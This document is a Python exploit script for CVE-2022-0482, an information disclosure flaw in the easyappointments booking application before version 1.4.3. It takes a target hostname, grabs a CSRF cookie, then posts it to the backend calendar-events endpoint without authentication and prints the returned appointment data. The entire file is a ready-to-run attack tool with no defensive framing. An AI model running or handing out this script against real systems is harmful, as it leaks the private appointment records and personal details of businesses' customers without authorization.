import requests
import argparse
import json

def extract_cookie(response, cookie_name):
    try:
        return response.cookies[cookie_name]
    except KeyError:
        print(f"Could not find {cookie_name} in cookies.")
        return ""

def make_requests(hostname, start_date, end_date):
    session = requests.Session()

    # First GET request to obtain csrfCookie
    url_get = f"http://{hostname}/"
    headers_get = {'Accept': '*/*'}
    response_get = session.get(url_get, headers=headers_get)

    csrf_token = extract_cookie(response_get, 'csrfCookie')
    if not csrf_token:
        print("CSRF token cookie not found. Exiting.")
        return

    # Second POST request to exploit
    url_post = f"http://{hostname}/index.php/backend_api/ajax_get_calendar_events"
    headers_post = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': f'csrfCookie={csrf_token}'  # Include the CSRF token as a cookie
    }
    payload = {'csrfToken': csrf_token, 'startDate': start_date, 'endDate': end_date}

    response_post = session.post(url_post, headers=headers_post, data=payload)

    print("POST request response:")
    response_json = response_post.json()
    print(json.dumps(response_json, indent=4))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2022-0482 vulnerability is a critical information disclosure flaw affecting the GitHub repository alextselegidis/easyappointments prior to version 1.4.3.')
    parser.add_argument('hostname', type=str, help='The hostname to which to exploit')
    parser.add_argument('--startDate', type=str, default='2023-10-25', help='The start date for the calendar events in the form YYYY-MM-DD')
    parser.add_argument('--endDate', type=str, default='2023-10-25', help='The end date for the calendar events in the form YYYY-MM-DD')

    args = parser.parse_args()

    if args.hostname:
        make_requests(args.hostname, args.startDate, args.endDate)
    else:
        print("Hostname is required. Use -h for help.")
